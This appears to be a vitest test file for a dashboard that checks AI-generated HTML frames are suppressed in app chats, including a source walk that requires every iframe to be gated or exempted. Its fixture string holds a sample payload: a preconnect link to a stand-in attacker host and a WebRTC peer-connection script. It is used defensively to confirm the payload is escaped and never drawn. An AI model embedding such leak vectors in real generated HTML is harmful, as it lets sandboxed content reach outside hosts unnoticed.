/**
 * An app chat draws no HTML the assistant wrote, in whichever pane it opens (owner decision,
 * 2026-11-02, after the security read that found `<link rel=preconnect>` and WebRTC STUN/TURN
 * reaching any host from a sandboxed `dream-html` frame with no click; no page policy can express
 * either). The rule is keyed on "this is an app chat" (`appChatContext.ts`: the session's flag in
 * the main pane, the embed grant in the app window), never on a pane or a format.
 *
 * 1. A WALK over every frame the dashboard draws: a file that creates an `<iframe>` either asks
 *    `useInAppChat()` or is named below with the reason it may draw. A new frame added later fails
 *    here until someone decides which it is (pattern: one more way in means the gate is on the
 *    wrong thing).
 * 2. The rule in render: a `dream-html` block and a question's previews do not draw in an app
 *    chat, the reader sees that they were not drawn, the labels still choose; outside an app chat
 *    both draw exactly as before.
 */
import { describe, expect, it, vi } from 'vitest';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, relative, sep } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createElement as h } from '../../dashboard/node_modules/react/index.js';
import { renderToStaticMarkup } from '../../dashboard/node_modules/react-dom/server.node.js';

vi.mock('../../dashboard/src/context/I18nContext.js', () => ({
  useI18n: () => ({ locale: 'en', setLocale: () => {}, t: (key: string) => key }),
  I18nProvider: ({ children }: { children: unknown }) => children,
}));
vi.mock('../../dashboard/src/context/VaultContext.js', () => ({
  useApi: () => ({ get: async () => ({}) }),
  useVaultId: () => 'v',
  useVault: () => ({ id: 'v' }),
}));

const SRC = fileURLToPath(new URL('../../dashboard/src/', import.meta.url));

/** Frames that may draw in an app chat, each with its reason. Nothing else may. */
const MAY_DRAW: Record<string, string> = {
  'components/sleepy/chat/PdfViewer.tsx': 'a PDF of this server, drawn by the local viewer; a PDF in an app chat must still draw',
  'components/sleepy/chat/htmlExport.ts': "only reached from HtmlView's fullscreen export, which the rule replaces with the notice",
  'lib/renderCard.ts': 'an EMPTY placeholder frame inside a detached clone serialised for Telegram (render_card); never attached, never drawn, no content',
};

function walk(dir: string, out: string[] = []): string[] {
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    if (statSync(p).isDirectory()) walk(p, out);
    else if (/\.(ts|tsx)$/.test(name) && !/\.test\./.test(name)) out.push(p);
  }
  return out;
}

/** Code with comments removed, so a frame named in prose is not a frame. */
function code(text: string): string {
  return text.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:'"`])\/\/.*$/gm, '$1');
}

describe('every frame of supplied HTML holds the app-chat rule', () => {
  const files = walk(SRC).map((p) => ({ rel: relative(SRC, p).split(sep).join('/'), text: code(readFileSync(p, 'utf-8')) }));
  const framing = files.filter((f) => /<iframe\b|createElement\(\s*['"]iframe['"]\s*\)/.test(f.text));

  it('finds the frames it is meant to judge', () => {
    const names = framing.map((f) => f.rel);
    for (const known of ['components/sleepy/chat/HtmlView.tsx', 'components/whiteboard/widgets/HtmlWidget.tsx', 'components/whiteboard/widgets/WebWidget.tsx', 'components/appLink/DocumentReader.tsx', 'components/layout/FrameViewer.tsx', 'components/lab/HtmlInsightBody.tsx', 'components/lab/LabAppFrame.tsx', 'components/lab/blocks/HtmlBlock.tsx']) {
      expect(names).toContain(known);
    }
  });

  it.each([...new Set(framing.map((f) => f.rel))])('%s asks useInAppChat() or says why it may draw', (rel) => {
    const f = framing.find((x) => x.rel === rel)!;
    if (MAY_DRAW[rel]) return;
    expect(f.text, `${rel} draws a frame and does not ask useInAppChat()`).toMatch(/\buseInAppChat\(\)/);
  });

  it('a plain board shuts Excalidraw\'s own web embeds in an app chat', () => {
    const t = readFileSync(join(SRC, 'components/core/ExcalidrawCanvas.tsx'), 'utf-8');
    expect(t).toMatch(/useInAppChat\(\)/);
    expect(t).toMatch(/validateEmbeddable=\{embeds \? embeds\.validateEmbeddable : htmlOff \? NO_LIVE_EMBED : undefined\}/);
  });

  it('the exemptions are still frames (a stale one is removed, not kept)', () => {
    for (const rel of Object.keys(MAY_DRAW)) expect(framing.map((f) => f.rel)).toContain(rel);
  });
});

const { AppChatContext } = await import('../../dashboard/src/components/sleepy/chat/appChatContext.js');
const { HtmlView } = await import('../../dashboard/src/components/sleepy/chat/HtmlView.js');
const { SurveyCard } = await import('../../dashboard/src/components/sleepy/chat/SurveyCard.js');
const { EmbedProvider } = await import('../../dashboard/src/components/embed/embedMode.js');
const { withoutHtmlFrames } = await import('../../dashboard/src/lib/excalidraw.js');
const { QueryClient, QueryClientProvider } = await import('../../dashboard/node_modules/@tanstack/react-query/build/modern/index.js');

const BLOCK = '<link rel="preconnect" href="https://SECRET.attacker.example"><p id="drawn">drawn</p><script>new RTCPeerConnection()</script>';

function render(appChat: boolean, child: unknown): string {
  const qc = new QueryClient();
  // The live frame reads the page's theme attribute; a server render has no page, so the
  // controls (outside an app chat) get the one attribute the frame asks for. The app-chat
  // renders get nothing: the rule must not reach the frame at all.
  if (!appChat) {
    vi.stubGlobal('document', { documentElement: { getAttribute: () => 'light' } });
    vi.stubGlobal('getComputedStyle', () => ({ getPropertyValue: () => '' }));
  }
  try {
    return renderToStaticMarkup(h(QueryClientProvider, { client: qc }, h(AppChatContext.Provider, { value: appChat }, child as never)));
  } finally {
    vi.unstubAllGlobals();
  }
}

describe('the rule in render', () => {
  it('an app chat leaves a notice where a dream-html block would draw, and its source as text', () => {
    const out = render(true, h(HtmlView, { html: BLOCK }));
    expect(out).not.toMatch(/<iframe/);
    expect(out).toContain('data-model-html-off');
    expect(out).toContain('appChat.htmlOff');
    // The source is text: escaped, never parsed.
    expect(out).toContain('&lt;link rel=&quot;preconnect&quot;');
    expect(out).not.toMatch(/<link /);
  });

  it('outside an app chat the block draws as before', () => {
    const out = render(false, h(HtmlView, { html: BLOCK }));
    expect(out).toMatch(/<iframe[^>]*class="chat-htmlview-frame"/);
    expect(out).not.toContain('data-model-html-off');
  });

  const ask = {
    id: 'q1', toolUseId: 'q1', requestId: 'q1',
    questions: [{
      question: 'Which look?', header: 'Look', multiSelect: false,
      options: [
        { label: 'Left', description: 'a', preview: BLOCK },
        { label: 'Right', description: 'b', preview: BLOCK },
      ],
    }],
  };
  const host = { answerQuestion: () => true, cancelQuestion: () => {} };

  it('an app chat draws a question with its labels and no preview, and says so', () => {
    const out = render(true, h(SurveyCard, { item: ask as never, session: host as never }));
    expect(out).not.toMatch(/<iframe/);
    expect(out).toContain('Left');
    expect(out).toContain('Right');
    expect(out).toContain('appChat.previewsOff');
  });

  it('outside an app chat the previews draw as before', () => {
    const out = render(false, h(SurveyCard, { item: ask as never, session: host as never }));
    expect(out).toMatch(/<iframe/);
    expect(out).not.toContain('appChat.previewsOff');
  });
});

describe('the key is the chat, not the embed', () => {
  const grant = (view: string) => ({ tk: 't', view, slug: 's', vault: 'v', member: null, insight: null, theme: null });
  it('the app window\'s chat screen holds the rule with no provider', () => {
    const out = renderToStaticMarkup(h(QueryClientProvider, { client: new QueryClient() }, h(EmbedProvider, { value: grant('chat') as never }, h(HtmlView, { html: BLOCK }))));
    expect(out).toContain('data-model-html-off');
    expect(out).not.toMatch(/<iframe/);
  });
  it('another embedded screen (an insight) is not a chat and draws as before', () => {
    vi.stubGlobal('document', { documentElement: { getAttribute: () => 'light' } });
    vi.stubGlobal('getComputedStyle', () => ({ getPropertyValue: () => '' }));
    try {
      const out = renderToStaticMarkup(h(QueryClientProvider, { client: new QueryClient() }, h(EmbedProvider, { value: grant('insight') as never }, h(HtmlView, { html: BLOCK }))));
      expect(out).toMatch(/<iframe/);
      expect(out).not.toContain('data-model-html-off');
    } finally { vi.unstubAllGlobals(); }
  });
});

describe("Excalidraw's own iframe element never reaches the canvas", () => {
  it('drops every element of type iframe and keeps the rest', () => {
    const els = [
      { id: 'r', type: 'rectangle' },
      { id: 'f', type: 'iframe', customData: { generationData: { status: 'done', html: BLOCK } } },
      { id: 'e', type: 'embeddable', link: 'https://www.youtube.com/embed/x' },
      null,
    ];
    expect(withoutHtmlFrames(els).map((e) => (e as { id?: string } | null)?.id ?? null)).toEqual(['r', 'e', null]);
  });
});
